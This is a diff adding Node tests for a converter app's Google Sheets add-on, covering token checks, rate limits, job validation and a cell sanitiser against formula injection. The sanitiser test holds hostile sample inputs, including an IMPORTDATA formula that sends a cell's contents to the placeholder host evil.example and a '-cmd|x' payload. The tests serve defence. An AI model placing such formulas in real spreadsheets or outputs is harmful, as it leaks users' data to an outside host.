@@ -1,6 +1,7 @@
 import test from "node:test";
 import assert from "node:assert/strict";
 import { readFileSync } from "node:fs";
+import vm from "node:vm";
 import { onRequestPost as convert } from "../functions/api/convert.js";
 import { onRequestPost as checkout } from "../functions/api/checkout.js";
 import { onRequestPost as loadRows } from "../functions/api/result-rows.js";
@@ -242,6 +243,132 @@ test("Apps Script add-on only calls aiconverter.app and identifies itself", () =
   assert.match(code, /'X-AIConverter-Client': CLIENT_ID/);
   assert.match(code, /var CLIENT_ID = 'sheets-addon'/);
 });
+
+test("Sheets add-on identity fails closed when Google certs cannot be fetched", async () => {
+  resetGoogleKeyCacheForTests();
+  const token = await signIdToken({});
+  let calls = 0;
+  const throwingFetch = async () => {
+    calls += 1;
+    throw new Error("network down");
+  };
+  const env = { GOOGLE_SHEETS_ADDON_CLIENT_IDS: CLIENT_ID };
+  const request = addonRequest("https://aiconverter.app/api/convert", token);
+  const first = await verifySheetsAddonIdentity(env, request, { fetchImpl: throwingFetch });
+  const second = await verifySheetsAddonIdentity(env, request, { fetchImpl: throwingFetch });
+  assert.equal(first.ok, false);
+  assert.equal(first.status, 401);
+  assert.equal(second.ok, false);
+  assert.equal(calls, 1, "a failed cert fetch should not be retried on every request");
+  resetGoogleKeyCacheForTests();
+});
+
+test("Sheets add-on uploads stop at a shared hourly cap across all Google accounts", async () => {
+  resetGoogleKeyCacheForTests();
+  const originalFetch = globalThis.fetch;
+  globalThis.fetch = certsFetch;
+  try {
+    const salt = "a-long-enough-test-salt-for-rate-limits";
+    const sharedId = await sha256(`${salt}:sheets-addon:all-accounts:${hourWindow()}`);
+    const counts = new Map([[sharedId, 3]]);
+    const form = new FormData();
+    form.set("file", new File(["hello"], "notes.txt", { type: "text/plain" }));
+    const response = await convert({
+      env: {
+        GOOGLE_SHEETS_ADDON_CLIENT_IDS: CLIENT_ID,
+        SHEETS_ADDON_MAX_UPLOADS_PER_HOUR: "3",
+        RATE_LIMIT_SALT: salt,
+        AICONVERTER_BUCKET: {},
+        AICONVERTER_DB: countingRateLimitDb(counts)
+      },
+      request: addonRequest("https://aiconverter.app/api/convert", await signIdToken({ sub: "fresh-account" }), { body: form })
+    });
+    assert.equal(response.status, 429);
+    assert.match((await response.json()).error, /add-on is busy/);
+  } finally {
+    globalThis.fetch = originalFetch;
+  }
+});
+
+test("Sheets add-on per-account limit names the Google account, not the connection", async () => {
+  resetGoogleKeyCacheForTests();
+  const originalFetch = globalThis.fetch;
+  globalThis.fetch = certsFetch;
+  try {
+    const salt = "a-long-enough-test-salt-for-rate-limits";
+    const accountId = await sha256(`${salt}:google:google-user-1:${hourWindow()}`);
+    const response = await convert({
+      env: {
+        GOOGLE_SHEETS_ADDON_CLIENT_IDS: CLIENT_ID,
+        RATE_LIMIT_SALT: salt,
+        AICONVERTER_BUCKET: {},
+        AICONVERTER_DB: countingRateLimitDb(new Map([[accountId, 8]]))
+      },
+      request: addonRequest("https://aiconverter.app/api/convert", await signIdToken({}), { body: new FormData() })
+    });
+    assert.equal(response.status, 429);
+    assert.match((await response.json()).error, /this Google account/);
+  } finally {
+    globalThis.fetch = originalFetch;
+  }
+});
+
+test("rows from jobs with no converter id are not treated as bank exports", async () => {
+  const token = "tok_null_converter";
+  const job = {
+    id: "job_null_converter",
+    token_hash: await sha256(token),
+    status: "complete",
+    paid_at: "2026-10-12T00:00:00.000Z",
+    converter_id: null,
+    result_key: "jobs/job_null_converter/result.csv",
+    expires_at: futureExpiry()
+  };
+  const response = await loadRows({
+    env: jobEnv(job, new Map([[job.result_key, "A,B\n1,2\n"]])),
+    request: new Request("https://aiconverter.app/api/result-rows", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ jobId: job.id, token })
+    })
+  });
+  assert.equal(response.status, 400);
+});
+
+test("Sheets add-on writes formula-like text as plain text but keeps numbers", () => {
+  const sandbox = {};
+  vm.createContext(sandbox);
+  vm.runInContext(readFileSync("sheets-addon/Code.gs", "utf8"), sandbox);
+  const safeCell = sandbox.safeCell_;
+  assert.equal(safeCell('=IMPORTDATA("https://evil.example/?"&A1)'), `'=IMPORTDATA("https://evil.example/?"&A1)`);
+  assert.equal(safeCell("+HYPERLINK(1)"), "'+HYPERLINK(1)");
+  assert.equal(safeCell("-cmd|x"), "'-cmd|x");
+  assert.equal(safeCell("@SUM(A1)"), "'@SUM(A1)");
+  assert.equal(safeCell("-12.50"), "-12.50");
+  assert.equal(safeCell("+1,250.00"), "+1,250.00");
+  assert.equal(safeCell("Coffee shop"), "Coffee shop");
+  assert.equal(safeCell(null), "");
+  assert.equal(safeCell(42), 42);
+});
+
+function countingRateLimitDb(counts) {
+  return {
+    prepare(sql) {
+      return {
+        bind(...values) {
+          return {
+            run: async () => {
+              if (sql.startsWith("INSERT INTO rate_limits")) counts.set(values[0], (counts.get(values[0]) || 0) + 1);
+              return {};
+            },
+            first: async () => (sql.startsWith("SELECT count FROM rate_limits") ? { count: counts.get(values[0]) || 0 } : null),
+            all: async () => ({ results: [] })
+          };
+        }
+      };
+    }
+  };
+}
 
 function hourWindow() {
   const windowStart = new Date();
